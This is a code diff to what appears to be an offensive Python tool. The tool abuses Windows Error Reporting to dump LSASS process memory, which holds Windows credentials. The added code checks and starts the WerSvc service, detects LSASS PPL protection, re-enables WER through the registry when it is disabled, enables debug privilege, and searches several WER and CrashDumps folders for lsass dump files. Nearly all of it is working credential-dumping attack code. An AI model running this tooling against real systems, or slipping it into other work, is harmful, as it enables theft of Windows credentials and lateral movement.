@@ -94,16 +94,101 @@ def cleanup_registry():
         pass
 
 
+def check_environment():
+    """Check WerSvc status and LSASS protection before running."""
+    import ctypes
+    import subprocess
+
+    # Check Windows build
+    build = platform.version()
+    print(f"[*] Windows build: {build}")
+
+    # Check if WerSvc is running
+    try:
+        result = subprocess.run(
+            ["sc", "query", "WerSvc"],
+            capture_output=True, text=True, timeout=5
+        )
+        if "RUNNING" in result.stdout:
+            print("[+] WerSvc: RUNNING")
+        elif "STOPPED" in result.stdout:
+            print("[!] WerSvc: STOPPED, attempting to start...")
+            subprocess.run(["sc", "start", "WerSvc"], capture_output=True, timeout=10)
+            time.sleep(2)
+            result2 = subprocess.run(["sc", "query", "WerSvc"], capture_output=True, text=True, timeout=5)
+            if "RUNNING" in result2.stdout:
+                print("[+] WerSvc: started successfully")
+            else:
+                print("[!] WerSvc: failed to start, dump may not be created")
+        else:
+            print(f"[!] WerSvc: unknown state")
+    except Exception as e:
+        print(f"[!] Could not query WerSvc: {e}")
+
+    # Check LSASS PPL (RunAsPPL)
+    import winreg
+    try:
+        key = winreg.OpenKeyEx(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"SYSTEM\CurrentControlSet\Control\Lsa",
+            0, winreg.KEY_READ
+        )
+        val, _ = winreg.QueryValueEx(key, "RunAsPPL")
+        winreg.CloseKey(key)
+        if val:
+            print("[!] LSASS is running as PPL (Protected Process Light)")
+            print("[!] WerFault cannot dump PPL-protected processes")
+        else:
+            print("[+] LSASS PPL: disabled")
+    except FileNotFoundError:
+        print("[+] LSASS PPL: not configured (disabled)")
+    except Exception:
+        pass
+
+    # Check WER settings that might block dumps
+    try:
+        key = winreg.OpenKeyEx(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"SOFTWARE\Microsoft\Windows\Windows Error Reporting",
+            0, winreg.KEY_READ
+        )
+        try:
+            disabled, _ = winreg.QueryValueEx(key, "Disabled")
+            if disabled:
+                print("[!] WER is DISABLED via registry (Disabled=1)")
+                print("[*] Enabling WER...")
+                wkey = winreg.OpenKeyEx(
+                    winreg.HKEY_LOCAL_MACHINE,
+                    r"SOFTWARE\Microsoft\Windows\Windows Error Reporting",
+                    0, winreg.KEY_SET_VALUE
+                )
+                winreg.SetValueEx(wkey, "Disabled", 0, winreg.REG_DWORD, 0)
+                winreg.CloseKey(wkey)
+                print("[+] WER enabled")
+        except FileNotFoundError:
+            print("[+] WER: enabled (default)")
+        winreg.CloseKey(key)
+    except Exception:
+        pass
+
+
 def find_dumps():
-    """Search for dump files, including in subdirectories."""
+    """Search for dump files everywhere WER might write them."""
     found = []
-    for pattern in [
-        os.path.join(DUMP_DIR, "lsass*.dmp"),
-        os.path.join(DUMP_DIR, "*.dmp"),
-        os.path.join(DUMP_DIR, "lsass*", "*.dmp"),
-        os.path.join(DUMP_DIR, "lsass*", "**", "*.dmp"),
-    ]:
-        found.extend(glob.glob(pattern, recursive=True))
+    search_dirs = [
+        DUMP_DIR,
+        r"C:\ProgramData\Microsoft\Windows\WER",
+        os.path.expandvars(r"%LOCALAPPDATA%\CrashDumps"),
+        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\WER"),
+    ]
+    for d in search_dirs:
+        for pattern in [
+            os.path.join(d, "lsass*.dmp"),
+            os.path.join(d, "*.dmp"),
+            os.path.join(d, "**", "lsass*.dmp"),
+            os.path.join(d, "**", "*.dmp"),
+        ]:
+            found.extend(glob.glob(pattern, recursive=True))
     proof = glob.glob(os.path.join(DUMP_DIR, "wer_proof*"))
     return list(set(found)), proof
 
@@ -133,8 +218,11 @@ def main():
     print(f"[*] Platform   : {platform.system()} {platform.machine()}")
     print()
 
+    # Check environment (WerSvc, PPL, WER disabled)
+    check_environment()
+    print()
+
     # Enable SeDebugPrivilege at process level BEFORE anything else.
-    # This fixes empty/missing dumps on Windows 1809 and Server 2019.
     enable_debug_privilege()
 
     # Pre-set registry keys so they exist before the BOF runs
